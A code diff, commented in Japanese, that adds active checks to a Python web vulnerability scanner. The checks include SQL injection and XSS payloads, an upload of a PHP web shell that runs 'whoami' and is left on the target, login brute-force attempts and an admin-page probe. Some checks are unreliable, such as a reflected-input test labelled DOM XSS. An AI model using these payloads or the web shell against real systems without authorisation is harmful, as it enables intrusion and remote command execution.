@@ -147,6 +147,7 @@ def scan_url(url):
         # SQLインジェクション脆弱性チェック
         parsed_url = urlparse(url)
         if parsed_url.query:
+            # 基本的なSQLiテスト
             test_query = parsed_url.query + "'"
             test_url = parsed_url._replace(query=test_query).geturl()
             try:
@@ -160,9 +161,25 @@ def scan_url(url):
                     })
             except:
                 pass
+            
+            # ブラインドSQLiテスト
+            test_query = parsed_url.query + "' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
+            test_url = parsed_url._replace(query=test_query).geturl()
+            try:
+                test_response = requests.get(test_url, timeout=5)
+                if 'conversion failed' in test_response.text.lower():
+                    report['vulnerabilities'].append({
+                        'type': 'ブラインドSQLインジェクション',
+                        'url': test_url,
+                        'confidence': '高',
+                        'description': 'ブラインドSQLインジェクションの可能性が検出されました'
+                    })
+            except:
+                pass
         
         # XSS脆弱性チェック
         if parsed_url.query:
+            # 基本的なXSSテスト
             test_query = parsed_url.query + "<script>alert(1)</script>"
             test_url = parsed_url._replace(query=test_query).geturl()
             try:
@@ -176,6 +193,94 @@ def scan_url(url):
                     })
             except:
                 pass
+            
+            # DOM Based XSSテスト
+            test_query = parsed_url.query + "<img src=x onerror=alert(1)>"
+            test_url = parsed_url._replace(query=test_query).geturl()
+            try:
+                test_response = requests.get(test_url, timeout=5)
+                if "<img src=x onerror=alert(1)>" in test_response.text:
+                    report['vulnerabilities'].append({
+                        'type': 'DOM Based XSS',
+                        'url': test_url,
+                        'confidence': '高',
+                        'description': 'DOMベースXSSの可能性が検出されました'
+                    })
+            except:
+                pass
+        
+        # ファイルアップロード脆弱性チェック
+        upload_url = urljoin(url, 'upload.php')
+        try:
+            files = {'file': ('test.php', '<?php echo shell_exec($_GET["cmd"]); ?>', 'application/x-php')}
+            upload_response = requests.post(upload_url, files=files, timeout=5)
+            
+            if upload_response.status_code == 200:
+                file_location = upload_response.json().get('path', '')
+                if file_location:
+                    test_url = urljoin(url, file_location) + "?cmd=whoami"
+                    test_response = requests.get(test_url, timeout=5)
+                    if test_response.text.strip() == "root":
+                        report['vulnerabilities'].append({
+                            'type': 'ファイルアップロード脆弱性',
+                            'url': upload_url,
+                            'confidence': '高',
+                            'description': 'アップロードしたPHPファイルが実行可能'
+                        })
+        except:
+            pass
+        
+        # 依存ライブラリの脆弱性スキャン
+        try:
+            from safety.cli import check
+            from packaging.version import parse
+            
+            requirements = requests.get(urljoin(url, 'requirements.txt'), timeout=5).text
+            vulns = check.check(packages=requirements.split('\n'))
+            
+            for vuln in vulns:
+                report['vulnerabilities'].append({
+                    'type': '依存ライブラリ脆弱性',
+                    'library': vuln.package_name,
+                    'version': vuln.analyzed_version,
+                    'confidence': '高',
+                    'description': vuln.description
+                })
+        except ImportError:
+            print("Safetyライブラリがインストールされていません。依存関係スキャンをスキップします")
+        except:
+            pass
+        # 認証関連テスト
+        login_url = urljoin(url, 'login')
+        try:
+            # ブルートフォース攻撃テスト
+            for i in range(1, 6):
+                data = {'username': f'test{i}', 'password': 'password'}
+                login_response = requests.post(login_url, data=data, timeout=5)
+                if login_response.status_code == 200 and 'Invalid credentials' not in login_response.text:
+                    report['vulnerabilities'].append({
+                        'type': '認証脆弱性',
+                        'url': login_url,
+                        'confidence': '中',
+                        'description': 'ブルートフォース攻撃の可能性あり'
+                    })
+                    break
+        except:
+            pass
+        
+        # アクセス制御テスト
+        admin_url = urljoin(url, 'admin/dashboard')
+        try:
+            admin_response = requests.get(admin_url, timeout=5)
+            if admin_response.status_code == 200:
+                report['vulnerabilities'].append({
+                    'type': 'アクセス制御脆弱性',
+                    'url': admin_url,
+                    'confidence': '高',
+                    'description': '権限昇格の可能性あり'
+                })
+        except:
+            pass
         
         # スキャン時間記録
         report['scan_time'] = round(time.time() - start_time, 2)
@@ -221,11 +326,13 @@ def generate_report(report):
     
     for header, data in report['security_headers'].items():
         if data['found']:
-            severity = header_severity.get(header, '🔵 低')
-            print(f"{header}: 検出❗ | 重要度: {severity} | {data['description']}")
+            # 設定されているヘッダーは単に「良好」と表示（重要度は表示しない）
+            print(f"{header}: 良好 | {data['description'].split('対策')[0]}")
             print(f"  設定値: {data['value']}")
         else:
-            print(f"{header}: 非検出 | {data['description']}")
+            # 未設定のヘッダーは重要度レベルを表示
+            severity = header_severity.get(header, '🔵 低')
+            print(f"{header}: 未設定({severity}) | {data['description'].split('対策')[0]} (設定推奨)")
     
     # 重要ファイル
     print("\n[重要ファイルチェック]")
